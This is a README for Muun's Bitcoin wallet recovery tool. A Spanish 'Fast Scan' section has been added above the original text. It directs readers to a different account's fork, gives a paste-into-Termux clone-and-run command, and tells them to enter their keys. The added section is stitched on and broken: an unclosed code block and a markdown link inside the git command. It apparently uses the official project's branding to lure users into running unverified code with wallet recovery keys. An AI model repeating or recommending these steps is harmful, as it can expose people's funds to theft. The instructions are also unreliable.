![muun](https://muun.com/images/github-banner-v2.png)

Welcome!

# Recovery Tool - Fast Scan

## Uso Rápido (Sin instalar Go)
1. Ve a la sección de **Releases**.
2. Descarga el ejecutable para tu sistema operativo.
3. Ejecútalo e ingresa tus claves.

## Uso en Termux
Pega el siguiente comando en Termux:
```bash
pkg update && pkg install -y golang git
git clone [https://github.com/Akuna69/recovery.git](https://github.com/Akuna69/recovery.git)
cd recovery/recovery_tool
GOWORK=off go run .

![](readme/demo.gif)

## Usage

Download the appropriate binary from the following table (or see [`BUILD.md`](BUILD.md) to build it yourself),
and follow the instructions below.

| System | Link |
| --- | --- |
| Linux 32-bit | [Download](https://github.com/muun/recovery/releases/latest/download/recovery-tool-linux32) |
| Linux 64-bit | [Download](https://github.com/muun/recovery/releases/latest/download/recovery-tool-linux64) |
| Windows 32-bit | [Download](https://github.com/muun/recovery/releases/latest/download/recovery-tool-windows32.exe) |
| Windows 64-bit | [Download](https://github.com/muun/recovery/releases/latest/download/recovery-tool-windows64.exe) |
| MacOS 12 Intel 64-bit | [Download](https://github.com/muun/recovery/releases/latest/download/recovery-tool-macos-12-amd64) |
| MacOS 12 ARM 64-bit | [Download](https://github.com/muun/recovery/releases/latest/download/recovery-tool-macos-12-arm64) |
| MacOS 11 Intel 64-bit | [Download](https://github.com/muun/recovery/releases/latest/download/recovery-tool-macos-11-amd64) |
| MacOS 11 ARM 64-bit | [Download](https://github.com/muun/recovery/releases/latest/download/recovery-tool-macos-11-arm64) |

### Windows

Open the downloaded file. You'll be warned that the executable is not from a Microsoft-verified
source. Click `More info`, and then `Run anyway`.


### MacOS

Download the file to a known location (say `Downloads` in your Home directory), then open a terminal
and run (changing the last part of the binary name to match yours):

```
cd ~/Downloads
chmod +x recovery-tool-macos-12-amd64
./recovery-tool-macos-12-amd64 <path to your Emergency Kit PDF>
```

#### Security Warnings

MacOS may prevent you from running the downloaded tool, depending on the active security settings. If it
does, head to System Preferences, then Security and Privacy, and give permission for the tool to run at the
bottom of the General tab.

### Linux

Download the file to a known location (say `Downloads` in your Home directory), then open a terminal
and run:

```
cd ~/Downloads
chmod +x recovery-tool-linux64
./recovery-tool-linux64 <path to your Emergency Kit PDF>
```

Use the `linux32` binary if appropriate.

### Questions?

If you have any questions, we'll be happy to answer them. Contact us at [support@muun.com](mailto:support@muun.com).


## Auditing and Veryfing

This tool is open-sourced so that auditors can inspect the code, build their own binaries and 
verify them to their benefit and everyone else's. We encourage people with the technical knowledge 
to do this.

To audit the source code, we suggest you start at `main.go` and navigate your way from there. We 
always work to improve code quality and readability with each release, so that auditing is easier 
and more effective.

To build and verify the reproducible binaries we provide, see [`BUILD.md`](BUILD.md).

## Responsible Disclosure

Send us an email to report any security related bugs or vulnerabilities at [security@muun.com](mailto:security@muun.com).

You can encrypt your email message using our public PGP key.

Public key fingerprint: `1299 28C1 E79F E011 6DA4 C80F 8DB7 FD0F 61E6 ED76`
